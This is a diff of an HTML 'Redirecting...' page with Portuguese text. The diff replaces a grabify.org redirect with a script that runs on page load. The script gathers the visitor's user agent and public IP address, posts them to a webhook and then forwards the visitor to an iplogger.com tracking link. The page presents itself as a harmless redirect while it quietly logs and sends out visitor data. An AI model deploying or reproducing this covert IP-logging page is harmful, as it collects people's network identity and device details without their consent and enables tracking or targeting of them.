@@ -1,10 +1,34 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta http-equiv="refresh" content="0;url=https://grabify.org/2VH01">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
+    <script>
+        async function logAndRedirect() {
+            const webhookUrl = "YOUR_WEBHOOK_URL_HERE";
+            const userAgent = navigator.userAgent;
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ipAddress = ipData.ip;
+
+            const logMessage = `${userAgent} : ${ipAddress}`;
+            
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: logMessage })
+            });
+
+            window.location.href = "https://iplogger.com/2lY8J3";
+        }
+
+        logAndRedirect();
+    </script>
 </head>
 <body>
-    <p>Se vocÊ não foi Redirecionado Clicke neste <a href="https://grabify.org/2VH01">link</a>.</p>
+    <p>Se você não foi redirecionado clicke aqui -> <a href="https://iplogger.com/2lY8J3">Link</a>.</p>
 </body>
 </html>
